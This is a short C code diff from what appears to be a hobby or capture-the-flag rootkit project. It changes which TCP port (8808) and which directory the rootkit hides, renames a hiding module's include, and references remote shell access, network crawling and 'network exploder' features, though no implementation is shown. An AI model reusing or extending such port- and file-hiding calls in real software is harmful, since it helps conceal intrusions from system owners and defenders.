@@ -9,7 +9,7 @@
 
 #include "cli_shell_access//cli_shell_access.h"
 #include "process_access/process_access.h"
-#include "file_hiding_access/file_hiding_access.h"
+#include "hider_access/hider_access.h"
 
 #include "features/network_crawler/network_crawler.h"
 #include "features/network_exploder/network_exploder.h"
@@ -29,8 +29,8 @@ void execute() {
 //    rootkit.run_plugin(remote_cli_id);
 
 
-    hide_tcp_port(8800);
-    hide_absolute_path("/home/idan/ctf/a.out");
+    hide_tcp_port(8808);
+    hide_absolute_path("/home/idan/ctf");
 //    hide_absolute_path("/home/idan"); // can't do that, clion freaks out
 //    hide_absolute_path("/proc/2906");
 
